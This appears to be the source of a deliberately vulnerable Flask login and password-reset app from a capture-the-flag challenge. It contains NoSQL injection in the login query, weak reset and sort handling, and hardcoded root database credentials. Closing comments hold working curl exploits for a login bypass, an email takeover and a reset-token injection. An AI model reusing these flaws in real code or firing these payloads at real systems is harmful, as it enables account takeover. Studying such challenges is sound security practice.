from flask import Flask, request, session, redirect, render_template, g
from pymongo import MongoClient
import mysql.connector
from mysql.connector import Error
import bcrypt
import time
import re
import traceback
import secrets

from flask_session import Session
from sqlalchemy import create_engine, Column, Integer, String, ForeignKey
from sqlalchemy.orm import relationship, sessionmaker, declarative_base
from sqlalchemy.exc import SQLAlchemyError

# Flask setup - session store
app = Flask(__name__)
app.secret_key = bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex()
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

# MongoDB setup - users
mongo_client = MongoClient("mongodb://mongo:27017/")
mongo_db = mongo_client["flaskdb"]
mongo_users = mongo_db["users"]
mongo_users.delete_many({})
admin_user = {
    "username": "admin",
    "password": bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex(),
    "email": "admin@securepractice.corp"
}
regular_user = {
    "username": "user",
    "password": bcrypt.hashpw(secrets.token_urlsafe(24).encode(), bcrypt.gensalt()).hex(),
    "email": "user@securepractice.corp"
}
mongo_users.insert_many([admin_user, regular_user])

# SQLite setup - audit trail
Base = declarative_base()
engine = create_engine("sqlite:///audit_log.db", connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine)

class SearchBase(Base):
    __tablename__ = "search_base"
    id = Column(Integer, primary_key=True)

class AuditLog(Base):
    __tablename__ = "audit_log"
    id = Column(Integer, primary_key=True)
    parent_id = Column(Integer, ForeignKey("search_base.id"))
    username = Column(String)
    action = Column(String)
    timestamp = Column(Integer)

def log_audit_event(username: str, action: str):
    try:
        db = SessionLocal()
        parent = db.query(SearchBase).first()
        if not parent:
            parent = SearchBase()
            db.add(parent)
            db.commit()
        db.add(AuditLog(username=username, action=action, timestamp=int(time.time()), parent_id=parent.id))
        db.commit()
    except SQLAlchemyError:
        pass
    finally:
        db.close()

# Generate a random token
def get_random_token():
    raw_token = secrets.token_urlsafe(24)
    hashed_token_bytes = bcrypt.hashpw(raw_token.encode('utf-8'), bcrypt.gensalt())
    return hashed_token_bytes.hex()

# Get the connection to MySQL db
def get_db():
    if 'mysql_conn' not in g:
        g.mysql_conn = mysql.connector.connect(
            host="mysql", user="root", password="rootpass", database="flaskdb"
        )
    return g.mysql_conn

# Main login page
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        if not re.fullmatch(r'^[\w@#$%^&+=!]{1,64}$', password):
            error = "Invalid password format."
        else:
            user = mongo_users.find_one({"username": username, "password": password})
            if user:
                session["email"] = user["email"]
                log_audit_event(username, "login_success")
                return redirect("/")
            log_audit_event(username, "login_failure")
            error = "Invalid credentials."
    return render_template("login.html", error=error)

# Allow users to change their email address
@app.route("/", methods=["GET", "POST"])
def me():
    if "email" not in session:
        return redirect("/login")
    current_email = session["email"]
    message = None
    if request.method == "POST":
        # Validate email
        new_email = request.get_json().get("new_email") if request.is_json else request.form.get("new_email")
        if mongo_users.find_one({"email": {"$eq": new_email}}):
            message = "That email is already in use."
        else:
            # Update email address
            result = mongo_users.update_one({"email": current_email}, {"$set": {"email": new_email}})
            if result.modified_count == 1:
                session["email"] = new_email
                message = "Email updated successfully"
            else:
                message = "Failed to update email."
    return render_template("me.html", email=session["email"], message=message)

# Administrators can view the audit logs
@app.route("/audit_logs", methods=["GET"])
def audit_logs():
    if "email" not in session:
        return redirect("/login")
    user = mongo_users.find_one({"email": session["email"]})
    if not user or user.get("username") != "admin":
        return "Access denied", 403
    order_by = request.args.get("order_by", "timestamp")
    if not any(order_by.startswith(col) for col in ['username', 'action', 'timestamp']):
        order_by = "timestamp"
    SearchBase.logs = relationship("AuditLog", order_by=f'AuditLog.{order_by}')
    db = SessionLocal()
    bases = db.query(SearchBase).all()
    logs = [log for base in bases for log in base.logs]
    db.close()
    return render_template("audit_logs.html", logs=logs)

# Users can request a new password
@app.route("/reset_request", methods=["GET", "POST"])
def reset_request():
    message = None
    if request.method == "POST":
        # Validate username
        username = request.form.get("username", "").strip()
        if not username:
            message = "Username is required."
        elif not username.isalnum():
            message = "Invalid username"
        elif 'admin' in username.lower():
            message = "Reset not allowed for admin"
        # Get user
        elif (user := mongo_users.find_one({"username": username})):
            conn = get_db()
            cursor = conn.cursor()
            try:
                # Remove all old entries
                cursor.execute("DELETE FROM reset_tokens WHERE username = %s", (username,))
                conn.commit()
                # Create new entry
                cursor.execute("INSERT INTO reset_tokens (username) VALUES (%s)", (username,))
                conn.commit()
                # Set new token
                cursor.execute("UPDATE reset_tokens SET token = %s WHERE username = %s", (get_random_token(), username))
                conn.commit()
                message = "Reset email sent." # Backend job sends the reset email
            except:
                message = "Unhandled failure."
            finally:
                cursor.close()
        else:
            message = "User not found."
        return render_template("result.html", message=message)
    return render_template("reset_request.html")

# Users can set a new password with a valid reset token
@app.route("/reset", methods=["GET", "POST"])
def reset():
    message = None
    if request.method == "POST":
        # Validate password and token
        token = request.form.get("token", "")
        new_password = request.form.get("new_password", "")
        if not re.fullmatch(r'^[\w@#$%^&+=!]{6,64}$', new_password):
            message = "Invalid password format."
        elif not token or len(token) < 16:
            message = "Invalid token format."
        else:
            # Get user for token
            conn = get_db()
            cursor = conn.cursor(dictionary=True)
            cursor.execute("SELECT * FROM reset_tokens WHERE token = %s", (token,))
            row = cursor.fetchone()
            cursor.close()
            if row:
                # Reset user password
                username = row["username"].strip()
                mongo_users.update_one({"username": username}, {"$set": {"password": new_password}})
                cursor = conn.cursor()
                cursor.execute("DELETE FROM reset_tokens WHERE username = %s", (username,))
                conn.commit()
                cursor.close()
                message = f"Password updated"
            else:
                message = "Invalid token."
        return render_template("result.html", message=message)
    return render_template("reset.html")

# Error handling and stuff
@app.errorhandler(404)
def not_found(e):
    return "Not found", 404

@app.teardown_appcontext
def close_db(error):
    conn = g.pop('mysql_conn', None)
    if conn and conn.is_connected():
        conn.close()

@app.errorhandler(Exception)
def handle_unexpected_error(error):
    traceback.print_exc()
    return "Internal Server Error", 500

@app.template_filter('datetimeformat')
def datetimeformat(value):
    try:
        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(int(value)))
    except:
        return "Invalid timestamp"


if __name__ == "__main__":
    
    Base.metadata.create_all(bind=engine)

    # MySQL setup - reset tokens
    for _ in range(10):
        try:
            mysql_conn = mysql.connector.connect(
                host="mysql", user="root", password="rootpass", database="flaskdb"
            )
            if mysql_conn.is_connected():
                break
        except Error:
            time.sleep(3)
    if not mysql_conn:
        raise Exception("MySQL connection failed.")
    # Reset token setup
    cursor = mysql_conn.cursor(dictionary=True)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS reset_tokens (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username CHAR(255),
            token CHAR(255) DEFAULT ''
        ) CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci;
    """)
    for username in ['user', 'admin']:
        cursor.execute("DELETE FROM reset_tokens WHERE username = %s", (username,))
        cursor.execute("INSERT INTO reset_tokens (username) VALUES (%s)", (username,))
        cursor.execute("UPDATE reset_tokens SET token = %s WHERE username = %s", (get_random_token(), username))
    mysql_conn.commit()
    cursor.close()
    mysql_conn.close()

    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)






# https://554cc0b2835315b90be22a55f10b92f8.chall.wwctf.com
# curl -X POST https://554cc0b2835315b90be22a55f10b92f8.chall.wwctf.com/login -d "username=user&password[\$ne]=" --cookie-jar cookies.txt
# curl -X POST https://554cc0b2835315b90be22a55f10b92f8.chall.wwctf.com/ -H "Content-Type: application/json" -d '{"new_email": "admin@securepractice.corp"}' --cookie cookies.txt
# curl -X POST http://<server>:5000/reset -d "token=' OR '1'='1&new_password=abc123"